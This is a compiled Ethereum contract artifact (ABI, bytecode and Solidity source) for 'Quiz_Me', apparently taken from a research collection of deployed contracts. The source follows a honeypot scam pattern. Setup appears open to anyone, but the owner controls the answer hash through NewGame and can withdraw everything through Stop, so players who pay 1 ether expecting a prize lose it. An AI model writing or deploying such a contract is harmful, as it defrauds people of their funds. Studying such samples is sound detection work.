{
  "contractName": "Quiz_Me",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Setup",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Stop",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "respHash",
          "type": "bytes32"
        }
      ],
      "name": "NewGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "a",
          "type": "address"
        }
      ],
      "name": "Sender",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061080c806100206000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063648f0bde1461007a57806396686560146100d6578063bedf0f4a14610178578063bfd66a4714610182578063c8166a8a146101ec578063d6558c3e1461027c575b005b6100d4600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506102bf565b005b610176600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506103e3565b005b6101806104bf565b005b6101ea600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061057b565b005b3480156101f857600080fd5b506102016105fd565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610241578082015181840152602081019050610226565b50505050905090810190601f16801561026e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561028857600080fd5b506102bd600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061069b565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102f957600080fd5b806040518082805190602001908083835b60208310151561032f578051825260208201915060208101905060208303925061030a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600019166002546000191614801561037c5750670de0b6b3a76400003410155b156103e0573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103de573d6000803e3d6000fd5b505b50565b60006001026002546000191614156104bb57806040518082805190602001908083835b60208310151561042b5780518252602082019150602081019050602083039250610406565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060028160001916905550816000908051906020019061047892919061073b565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561051b57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610578573d6000803e3d6000fd5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156105d757600080fd5b81600090805190602001906105ed92919061073b565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106935780601f1061066857610100808354040283529160200191610693565b820191906000526020600020905b81548152906001019060200180831161067657829003601f168201915b505050505081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156106f757600080fd5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061077c57805160ff19168380011785556107aa565b828001600101855582156107aa579182015b828111156107a957825182559160200191906001019061078e565b5b5090506107b791906107bb565b5090565b6107dd91905b808211156107d95760008160009055506001016107c1565b5090565b905600a165627a7a72305820c54d989d5e740ece966bc0730a6dd7455801298c271a0b9f20a1a18088e710cf0029",
  "source": "\n\ncontract Quiz_Me\n{\n    string public Question;\n    address questionSender;\n    bytes32 responseHash;\n\n    function() public payable{}\n\n    function Play(string resp) public payable {\n        require(msg.sender == tx.origin);\n        if (responseHash == keccak256(resp) && msg.value >= 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function Setup(string q, string resp) public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(resp);\n            Question = q;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function Stop() public payable {\n       require(msg.sender == questionSender);\n       msg.sender.transfer(address(this).balance);\n    }\n    \n    function NewGame(string q, bytes32 respHash) public payable {\n        require(msg.sender == questionSender);\n        Question = q;\n        responseHash = respHash;\n    }\n    \n    function Sender(address a) {\n        require(msg.sender == questionSender);\n        questionSender = a;\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x4f494b04222c1893e87d25c7e75dbc0ecd3aadf8/contracts/0x4f494b04222c1893e87d25c7e75dbc0ecd3aadf8.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:53:40.772Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}